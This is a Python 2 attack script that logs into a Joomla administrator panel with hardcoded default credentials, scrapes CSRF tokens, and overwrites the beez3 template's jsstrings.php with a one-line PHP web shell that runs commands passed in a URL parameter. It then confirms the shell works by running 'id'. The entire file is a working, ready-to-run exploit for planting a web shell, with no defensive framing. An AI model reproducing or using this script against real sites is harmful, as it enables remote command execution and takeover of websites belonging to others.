#!/usr/bin/env python
# joomla_shellup.py - small script to upload shell in Joomla
#
# 02.05.2017, rewrited: 27.05
# -- hint --
# To exploit this "feature" you will need valid credentials.'
# Based on latest (3.6.5-1) version.'
#   Tested also on: 3.7.x
R = '\033[31m' # Red
B = '\033[1;34m' #Blue
N = '\033[1;37m' # White

import requests
import re

target = raw_input(""+N+"(console)> ("+R+"joomla_simple_shell"+N+"): ")
print ""+B+"[*]"+N+" Starting attacks..."

print ''+B+'['+R+'-'+B+'] '+N+'Checking: ' + str(target)

# initGET
session = requests.session()
initlink = target + '/administrator/index.php'

initsend = session.get(initlink)
initresp = initsend.text

find_token = re.compile('<input type="hidden" name="(.*?)" value="1"/>')
found_token = re.search(find_token, initresp)

if found_token:
  initToken = found_token.group(1)
  print '"+B+"["+R+"!"+B+"] "+N+"Found init token: ' + initToken

  print '"+B+"["+R+"*"+B+"]"+N+" Preparing login request'
  data_login = {
        'username':'user',
        'passwd':'bitnami',
        'lang':'',
        'option':'com_login',
        'task':'login',
        'return':'aW5kZXgucGhw',
        initToken:'1'
  }
  data_link = initlink
  doLogin = session.post(data_link, data=data_login)
  loginResp = doLogin.text

  print ''+B+'[+] '+N+'At this stage we should be logged-in as an admin :)'

  uplink = target + '/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA%3D'
  filename = 'jsstrings.php'
  print ''+B+'[+] '+N+'File to change: ' + str(filename)

  getnewtoken = session.get(uplink)
  getresptoken = getnewtoken.text

  newToken = re.compile('<input type="hidden" name="(.*?)" value="1"/>')
  newFound = re.search(newToken, getresptoken)

  if newFound:
    newOneTok = newFound.group(1)
    print ''+B+'[+] '+N+'Grabbing new token from logged-in user: ' + newOneTok

    getjs = target+'/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA%3D'
    getjsreq = session.get(getjs)
    getjsresp = getjsreq.text

    # print getjsresp
    print ''+B+'[+] '+N+'Shellname: ' + filename
    shlink = target + '/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA='
    shdata_up = {
        'jform[source]':'<?php system($_GET["x"]);',
        'task':'template.apply',
        newOneTok:'1',
        'jform[extension_id]':'503',
        'jform[filename]':'/'+filename
    }
    shreq = session.post(shlink, data=shdata_up)
    path2shell = '/templates/beez3/jsstrings.php?x=id'
    print ''+B+'['+R+'!'+B+'] '+N+'Shell is ready to use: ' + str(path2shell)
    print ''+B+'[+] '+N+'Checking:'
    shreq = session.get(target + path2shell)
    shresp = shreq.text

    print shresp


print '\n'+B+'[!] '+N+'Module finished.'
